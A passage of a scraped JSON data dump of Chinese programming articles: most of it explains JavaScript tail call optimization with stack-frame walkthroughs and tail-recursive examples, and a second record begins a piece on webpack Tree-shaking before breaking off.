\u003c/h3\u003e\u003cp\u003e粗略的来说，如果当一个函数所做的最后一件事是调用了另一个函数，而后者不需要向调用者返回任何东西时；以及由此可知，在这种情况下没有调用者的额外信息需要被储存在调用栈(call stack)上，函数间的调用更像一种goto跳转的时候 -- 这种调用就被成为尾调用(tail call)，此时使得内存栈不再增长的行为就称为尾调用优化(TCO - tail call optimization)。\u003c/p\u003e\u003cp\u003e举个例子来更好的理解下TCO。首先说明一下是否用TCO的区别：\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e id(x) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e x; // (A)\n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e f(a) {\n    const b = a + 1;\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e id(b); // (B)\n}\nconsole.log(f(2)); // (C)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003ch4\u003e1.1 正常的执行 \u003c/h4\u003e\u003cp\u003e假设有一个JS引擎通过\u0026nbsp;\u003ci\u003e存储本地变量并返回栈上的地址\u0026nbsp;\u003c/i\u003e来管理方法调用。该引擎会如何执行上述代码呢？\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003eStep 1.\u003c/b\u003e 最初，栈上只有全局变量\u003ccode\u003eid\u003c/code\u003e和\u003ccode\u003ef\u003c/code\u003e。\u003c/p\u003e\u003cdiv\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bee13da1a8ee2?w=1058\u0026amp;h=299\u0026amp;f=jpeg\u0026amp;s=38532\"\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e栈会对当前作用域的状态(包括本地变量、参数等)进行编码，形成被称为“调用帧”(frame)的一块。\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003eStep 2.\u003c/b\u003e 在代码中的C行，\u003ccode\u003ef()\u003c/code\u003e被调用：首先，将要return到的位置被记录在栈中；然后\u003ccode\u003ef\u003c/code\u003e的参数\u003ccode\u003ea\u003c/code\u003e被分配并执行。\u003c/p\u003e\u003cdiv\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bee13d4ddf1f7?w=1058\u0026amp;h=541\u0026amp;f=jpeg\u0026amp;s=59928\"\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e栈现在看起来是这样的：共有两个调用帧，一个是位于底部的全局作用域，另一个是其上方 的\u003ccode\u003ef()\u003c/code\u003e。\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cb\u003eStep 3.\u003c/b\u003e \u003ccode\u003eid()\u003c/code\u003e\u0026nbsp;在B行中被调用。再次形成了一个调用帧，包含了\u003ccode\u003eid\u003c/code\u003e将要返回到的地址及其参数\u003ccode\u003ex\u003c/code\u003e被分配和调用的值。\u003c/p\u003e\u003cdiv\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bee13d9b0e436?w=1058\u0026amp;h=729\u0026amp;f=jpeg\u0026amp;s=75323\"\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cb\u003eStep 4.\u003c/b\u003e\u0026nbsp;在行A，结果\u003ccode\u003ex\u003c/code\u003e被返回。\u003ccode\u003eid\u003c/code\u003e的调用栈被移除，执行过程跳转到其调用帧中存储的要return的位置，也就是行B。(处理返回值有多种途径，最常见的两种是将结果留在栈中和在寄存器中处理之，此处按下不表)\u003c/p\u003e\u003cp\u003e栈现在是这副模样的了：\u003c/p\u003e\u003cdiv\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bee13d4ddf1f7?w=1058\u0026amp;h=541\u0026amp;f=jpeg\u0026amp;s=59928\"\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cb\u003eStep 5.\u003c/b\u003e 在行B中，从\u003ccode\u003eid\u003c/code\u003e中返回的值将继续返回给\u003ccode\u003ef\u003c/code\u003e的调用者。照旧，最上面的调用帧被移除，执行过程跳转到要return的位置 -- 行C。\u003c/p\u003e\u003cdiv\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bee13da1a8ee2?w=1058\u0026amp;h=299\u0026amp;f=jpeg\u0026amp;s=38532\"\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cb\u003eStep 6.\u003c/b\u003e 行C接收到返回值\u003ccode\u003e3\u003c/code\u003e并完成打印工作。\u003c/p\u003e\u003ch4\u003e1.2 尾调用优化\u003c/h4\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e id(x) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e x; // (A)\n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e f(a) {\n    const b = a + 1;\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e id(b); // (B)\n}\nconsole.log(f(2)); // (C)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e回顾上个章节的过程，其实 step 5 是多余的。行B中发生的全部事情其实只不过是把\u003ccode\u003eid()\u003c/code\u003e中返回的值传递给行C罢了。理想情况是，\u003ccode\u003eid()\u003c/code\u003e可以自行完成这一步，而跳过二传手 step 5。\u003cbr\u003e\u003c/p\u003e\u003cp\u003e可以通过对行B的函数调用采取不一样的实现方式来达成以上目的。栈在调用发生前是这样的：\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bee13d4ddf1f7?w=1058\u0026amp;h=541\u0026amp;f=jpeg\u0026amp;s=59928\"\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e检查这次调用就会发现，它是\u003ccode\u003ef()\u003c/code\u003e的最后一个行为。一旦\u003ccode\u003eid()\u003c/code\u003e完成，\u003ccode\u003ef()\u003c/code\u003e剩余执行的唯一行为就是把前者的结果返回给自身的调用者。因此，\u003ccode\u003ef\u003c/code\u003e中的变量就不需要了，其调用帧也就可以在这次调用之前被移除了。赋给\u003ccode\u003eid()\u003c/code\u003e的将要return地址直接可以是\u003ccode\u003ef\u003c/code\u003e的return地址，也就是行C了。在\u003ccode\u003eid()\u003c/code\u003e执行期间，栈看起来就是这样的：\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cimg alt=\"\" src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bee13de9c1970?w=1066\u0026amp;h=491\u0026amp;f=jpeg\u0026amp;s=55558\"\u003e\u003cdiv\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003eid()\u003c/code\u003e返回了数值\u003ccode\u003e3\u003c/code\u003e，或者可以说它为\u003ccode\u003ef()\u003c/code\u003e返回了这个值；因为通过行C，该值被传递给了\u003ccode\u003ef\u003c/code\u003e的调用者。\u003c/p\u003e\u003cp\u003e不难发现，行B的函数调用就是一个尾调用。这样的调用可以在栈0增长的情况下完成。要判断函数调用是否是尾调用，必须检查其是否处于尾部(比如最后一个行为)。下一章节将讲述如何做到。\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003ch3\u003e2. 检查函数调用是否在尾部发生 \u003c/h3\u003e\u003cp\u003e我们已经了解到尾调用可以被更有效率的执行，那么如何认定一个尾调用呢？\u003cbr\u003e\u003c/p\u003e\u003cp\u003e首先，调用函数的方式是无所谓的。下列调用如果出现在尾部，就都可以被优化：\u003cbr\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003e函数调用: \u003ccode\u003efunc(···)\u003c/code\u003e\u003c/li\u003e\u003cli\u003e方法调用: \u003ccode\u003eobj.method(···)\u003c/code\u003e\u003c/li\u003e\u003cli\u003e通过\u0026nbsp;\u003ccode\u003ecall()\u003c/code\u003e: \u003ccode\u003efunc.call(···)\u003c/code\u003e\u003c/li\u003e\u003cli\u003e通过\u0026nbsp;\u003ccode\u003eapply()\u003c/code\u003e: \u003ccode\u003efunc.apply(···)\u003c/code\u003e\u003c/li\u003e\u003c/ul\u003e\u003ch4\u003e2.1 表达式中的尾调用 \u003c/h4\u003e\u003cp\u003e箭头函数可以用表达式作为方法体。对于尾调用优化，因此必须找出表达式中函数调用的尾部。只有下列表达式会包含尾调用：\u003cbr\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003e条件操作符 (\u003ccode\u003e? :\u003c/code\u003e)\u003c/li\u003e\u003cli\u003e逻辑或 (\u003ccode\u003e||\u003c/code\u003e)\u003c/li\u003e\u003cli\u003e逻辑与 (\u003ccode\u003e\u0026amp;\u0026amp;\u003c/code\u003e)\u003c/li\u003e\u003cli\u003e逗号 (\u003ccode\u003e,\u003c/code\u003e)\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e分别来举例看一下：\u003c/p\u003e\u003ch5\u003e2.1.1 条件操作符 (? :) \u003c/h5\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econst a = x =\u0026gt; x ? f() : g();\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003ef()\u003c/code\u003e\u0026nbsp;和\u0026nbsp;\u003ccode\u003eg()\u003c/code\u003e\u0026nbsp;都在尾部。\u003c/p\u003e\u003ch5\u003e2.1.2 逻辑或 (||) \u003c/h5\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econst a = () =\u0026gt; f() || g();\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003ccode\u003ef()\u003c/code\u003e\u0026nbsp;不在尾部，\u003ccode\u003eg()\u003c/code\u003e\u0026nbsp;在尾部。至于为什么，看看下面的等价代码就知道了：\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econst a = () =\u0026gt; {\n    const fResult = f(); // not a tail call\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (fResult) {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e fResult;\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e g(); // tail call\n    }\n};\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e逻辑或操作符的结果依赖于\u003ccode\u003ef()\u003c/code\u003e的结果，所以是\u003ccode\u003eg()\u003c/code\u003e，而非\u003ccode\u003ef()\u003c/code\u003e的方法调用(调用者在其返回后又做了些什么)处于尾部。\u003cbr\u003e\u003c/p\u003e\u003ch5\u003e2.1.3 逻辑与\u0026nbsp;(\u0026amp;\u0026amp;)\u003c/h5\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econst a = () =\u0026gt; f() \u0026amp;\u0026amp; g();\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e同样，\u003ccode\u003ef()\u003c/code\u003e 不在尾部，\u003ccode\u003eg()\u003c/code\u003e 在尾部：\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econst a = () =\u0026gt; {\n    const fResult = f(); // not a tail call\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (!fResult) {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e fResult;\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e g(); // tail call\n    }\n};\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e理由和逻辑或相同。\u003c/p\u003e\u003ch5\u003e2.1.4 逗号 (,) \u003c/h5\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econst a = () =\u0026gt; (f() , g());\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e依然是，\u003ccode\u003ef()\u003c/code\u003e 不在尾部，\u003ccode\u003eg()\u003c/code\u003e 在尾部：\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003econst a = () =\u0026gt; {\n    f();\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e g();\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003ch4\u003e2.2 声明语句中的尾调用 \u003c/h4\u003e\u003cp\u003e对于声明语句，下列规则适用，只有这些混合声明语句会包含尾调用：\u003c/p\u003e\u003cul\u003e\u003cli\u003e块 (用\u0026nbsp;\u003ccode\u003e{}\u003c/code\u003e界定，有时会有一个label)\u003c/li\u003e\u003cli\u003e\u003ccode\u003eif\u003c/code\u003e: 包括逻辑上的 “then” 和 “else” 子句\u003c/li\u003e\u003cli\u003e\u003ccode\u003edo-while\u003c/code\u003e, \u003ccode\u003ewhile\u003c/code\u003e, \u003ccode\u003efor\u003c/code\u003e: 在其循环体中\u003c/li\u003e\u003cli\u003e\u003ccode\u003eswitch\u003c/code\u003e: 在其判断体中\u003c/li\u003e\u003cli\u003e\u003ccode\u003etry-catch\u003c/code\u003e: 只在\u0026nbsp;\u003ccode\u003ecatch\u003c/code\u003e\u0026nbsp;子句中，\u003ccode\u003etry\u003c/code\u003e\u0026nbsp;子句将\u0026nbsp;\u003ccode\u003ecatch\u003c/code\u003e\u0026nbsp;子句作为上下文，导致无法被优化\u003c/li\u003e\u003cli\u003e\u003ccode\u003etry-finally\u003c/code\u003e, \u003ccode\u003etry-catch-finally\u003c/code\u003e: 只在\u0026nbsp;\u003ccode\u003efinally\u003c/code\u003e\u0026nbsp;子句中，它会成为其他子句的上下文\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e对于所有原子(非混合)声明语句，只有\u003ccode\u003ereturn\u003c/code\u003e会包含尾调用。其他此类声明语句都有无法被优化的上下文。如下所示，当\u003ccode\u003eexpr\u003c/code\u003e部分包含尾调用时，下列声明语句就包含尾调用。\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e «expr»;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003ch4\u003e2.3 尾调用优化只在严格模式下有效 \u003c/h4\u003e\u003cp\u003e在非严格模式下，大多数引擎会包含下面两个属性，以便开发者检查调用栈：\u003cbr\u003e\u003c/p\u003e\u003cul\u003e\u003cli\u003e\u003ccode\u003efunc.arguments\u003c/code\u003e: 表示对\u0026nbsp;\u003ccode\u003efunc\u003c/code\u003e最近一次调用所包含的参数\u003c/li\u003e\u003cli\u003e\u003ccode\u003efunc.caller\u003c/code\u003e:\u0026nbsp;引用对 \u003ccode\u003efunc\u003c/code\u003e最近一次调用的那个函数\u003c/li\u003e\u003c/ul\u003e\u003cp\u003e在尾调用优化中，这些属性不再有用，因为相关的信息可能以及被移除了。因此，严格模式(strict mode)禁止这些属性，并且尾调用优化只在严格模式下有效。\u003cbr\u003e\u003c/p\u003e\u003ch4\u003e2.4\u0026nbsp;单独的函数调用不算在尾部\u003c/h4\u003e\u003cp\u003e下面的代码中，对\u003ccode\u003ebar()\u003c/code\u003e\u0026nbsp;的函数调用不算在尾部：\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efoo\u003c/span\u003e\u003c/span\u003e() {\n    bar(); // this is not a tail call \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e JS\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e原因在于\u003ccode\u003efoo()\u003c/code\u003e的最后一个动作不是对\u003ccode\u003ebar()\u003c/code\u003e 的函数调用，而是隐式的返回了\u003ccode\u003eundefined\u003c/code\u003e。换句话说，\u003ccode\u003efoo()\u003c/code\u003e的行为如下：\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efoo\u003c/span\u003e\u003c/span\u003e() {\n    bar();\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e undefined;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e调用者可以依赖一个总是返回\u003ccode\u003eundefined\u003c/code\u003e的\u003ccode\u003efoo()\u003c/code\u003e；但如果对\u003ccode\u003ebar()\u003c/code\u003e做了尾调用优化，那么其返回值就有可能改变了\u003ccode\u003efoo\u003c/code\u003e的行为。\u003cbr\u003e\u003c/p\u003e\u003cp\u003e因此，如果想要\u003ccode\u003ebar()\u003c/code\u003e成为一个尾调用，就得改成这样：\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003efoo\u003c/span\u003e\u003c/span\u003e() {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e bar(); // tail call\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003ch3\u003e3. 尾递归函数\u003c/h3\u003e\u003cp\u003e如果一个函数的主递归调用发生在尾部，那这个函数就是尾递归。\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cp\u003e譬如，下面的阶乘函数不是尾递归，因为行A中的主递归调用不在尾部：\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e factorial(x) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (x \u0026lt;= 0) {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e 1;\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e x * factorial(x-1); // (A)\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e可以用一个辅助方法\u003ccode\u003efacRec()\u003c/code\u003e来使\u003ccode\u003efactorial()\u003c/code\u003e成为尾递归。行A中的主递归调用处于尾部了：\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e factorial(n) {\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e facRec(n, 1);\n}\n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e facRec(x, acc) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (x \u0026lt;= 1) {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e acc;\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e facRec(x-1, x*acc); // (A)\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e这样，一些非尾递归的函数就可以转化成尾递归了。\u003cbr\u003e\u003c/p\u003e\u003ch4\u003e3.1 尾递归循环\u003c/h4\u003e\u003cp\u003e尾调用优化使得在递归循环中不增长调用栈成为可能。下面举两个例子。\u003cbr\u003e\u003c/p\u003e\u003ch5\u003e3.1.1 forEach() \u003c/h5\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003eEach(arr, callback, start = 0) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (0 \u0026lt;= start \u0026amp;\u0026amp; start \u0026lt; arr.length) {\n        callback(arr[start], start, arr);\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003eEach(arr, callback, start+1); // tail call\n    }\n}\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003eEach([\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e], (elem, i) =\u0026gt; console.log(`\u003cspan class=\"hljs-variable\"\u003e${i}\u003c/span\u003e. \u003cspan class=\"hljs-variable\"\u003e${elem}\u003c/span\u003e`));\n\n// Output:\n// 0. a\n// 1. b\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003ch5\u003e3.1.2 findIndex() \u003c/h5\u003e\u003cdiv\u003e\u003cdiv\u003e\u003cpre class=\"hljs bash\"\u003e\u003ccode\u003e\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e findIndex(arr, predicate, start = 0) {\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (0 \u0026lt;= start \u0026amp;\u0026amp; start \u0026lt; arr.length) {\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (predicate(arr[start])) {\n            \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e start;\n        }\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e findIndex(arr, predicate, start+1); // tail call\n    }\n}\nfindIndex([\u003cspan class=\"hljs-string\"\u003e'a'\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e], x =\u0026gt; x === \u003cspan class=\"hljs-string\"\u003e'b'\u003c/span\u003e); // 1\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cdiv\u003e\u003cb\u003e(end)\u003c/b\u003e\u003c/div\u003e\u003cp\u003e\u003cb\u003e----------------------------------------\u003c/b\u003e\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003cdiv\u003e\u003c/div\u003e\u003cdiv\u003e长按二维码或搜索 fewelife 关注我们哦 \u003cimg src=\"https://user-gold-cdn.xitu.io/2017/11/17/15fc7e84adafedc2?imageView2/0/w/1280/h/960/ignore-error/1\"\u003e\u003c/div\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e","buildTime":"1515066896.6574","__v":0}
{"_id":{"$oid":"5a4e17dee8405d2778beac8d"},"id":"5a4dc842518825698e7279a9","author":{"$oid":"5a4b76a1b11e1a170cb138d5"},"imageCache":[{"imageUrlArray":["https://user-gold-cdn.xitu.io/2018/1/4/160bfd6b970411f3?w=720\u0026h=405\u0026f=jpeg\u0026s=6737","https://user-gold-cdn.xitu.io/2018/1/4/160bfdcf2a31ce4a?w=606\u0026h=341\u0026f=gif\u0026s=3761493","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6b8b552461?w=720\u0026h=405\u0026f=jpeg\u0026s=12958","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6b8cae9900?w=720\u0026h=405\u0026f=jpeg\u0026s=6384","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6b8b4818fd?w=720\u0026h=405\u0026f=jpeg\u0026s=13053","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6baf4b104b?w=720\u0026h=405\u0026f=jpeg\u0026s=16079","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6baf24ec38?w=720\u0026h=438\u0026f=jpeg\u0026s=23130","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bb11fd152?w=720\u0026h=463\u0026f=jpeg\u0026s=40456","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bb8832182?w=720\u0026h=405\u0026f=jpeg\u0026s=19655","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bc4a537f6?w=720\u0026h=646\u0026f=jpeg\u0026s=16134","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bd406dd90?w=720\u0026h=343\u0026f=jpeg\u0026s=18232","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bcd7d371a?w=720\u0026h=962\u0026f=jpeg\u0026s=67249","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bcd97b34f?w=720\u0026h=446\u0026f=jpeg\u0026s=14514","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bd77e84e0?w=720\u0026h=507\u0026f=jpeg\u0026s=17925","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bd7406d51?w=720\u0026h=499\u0026f=jpeg\u0026s=48979","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bdec358f0?w=720\u0026h=831\u0026f=jpeg\u0026s=84376","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bef14e6fd?w=521\u0026h=534\u0026f=jpeg\u0026s=18147","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bef36c293?w=720\u0026h=482\u0026f=jpeg\u0026s=30357","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bf23f1d6d?w=720\u0026h=405\u0026f=jpeg\u0026s=15712","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6c102e5ed1?w=720\u0026h=405\u0026f=jpeg\u0026s=17714","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6bf5516b9d?w=720\u0026h=261\u0026f=jpeg\u0026s=19369","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6c064d09f0?w=720\u0026h=405\u0026f=jpeg\u0026s=6175","https://user-gold-cdn.xitu.io/2018/1/4/160bfd6c0dc2ba58?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"],"screenShot":null}],"title":"Tree-Shaking性能优化实践 - 原理篇","meta":{"likeCount":0},"tag":["Webpack","rollup.js"],"comment":[],"shortContent":"一. 什么是Tree-shaking 上图形象的解释了Tree-shaking 的本意，本文所说的前端中的tree-shaking可以理解为通过工具\"摇\"我们的JS文件，将其中用不到的代码\"摇\"掉，是一个性能优化的范畴。具体来说，在 webpack 项目中，有一个入口文件，相当…","content":"\u003cdiv\u003e\u003cbr\u003e\u003c/div\u003e\u003cdiv\u003e\u003ch2\u003e一. 什么是Tree-shaking\u003c/h2\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6b970411f3?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=6737\"\u003e\u003c/div\u003e\u003cp\u003e先来看一下Tree-shaking原始的本意\u003c/p\u003e\u003cdiv\u003e\u003cbr\u003e\u003cdiv\u003e\u003cp\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfdcf2a31ce4a?w=606\u0026amp;h=341\u0026amp;f=gif\u0026amp;s=3761493\"\u003e\u003cbr\u003e\u003c/p\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003e上图形象的解释了Tree-shaking 的本意，本文所说的前端中的tree-shaking可以理解为通过工具\"摇\"我们的JS文件，将其中用不到的代码\"摇\"掉，是一个性能优化的范畴。具体来说，在 webpack 项目中，有一个入口文件，相当于一棵树的主干，入口文件有很多依赖的模块，相当于树枝。实际情况中，虽然依赖了某个模块，但其实只使用其中的某些功能。通过 tree-shaking，将没有使用的模块摇掉，这样来达到删除无用代码的目的。\u003c/p\u003e\u003cdiv\u003e\u003cimg src=\"https://user-gold-cdn.xitu.io/2018/1/4/160bfd6b8b552461?w=720\u0026amp;h=405\u0026amp;f=jpeg\u0026amp;s=12958\"\u003e\u003cdiv\u003e\u003cbr\u003e\u003c/div\u003e\u003c/div\u003e\u003cp\u003eTree-shaking 较早由 Rich_Harris 的 rollup 实现，后来，webpack2 也增加了tree-shaking 的功能。其实在更早，google closure compiler 也做过类似的事情。三个工具的效果和使用各不相同，使用方法可以通过官网文档去了解，三者的效果对比，后文会详细介绍。\u003c/p\u003e\u003cp\u003e\u003cbr\u003e\u003c/p\u003e\u003ch2\u003e二. tree-shaking的原理\u003c/h2\u003e\u003cdiv\u003e\u003cimg 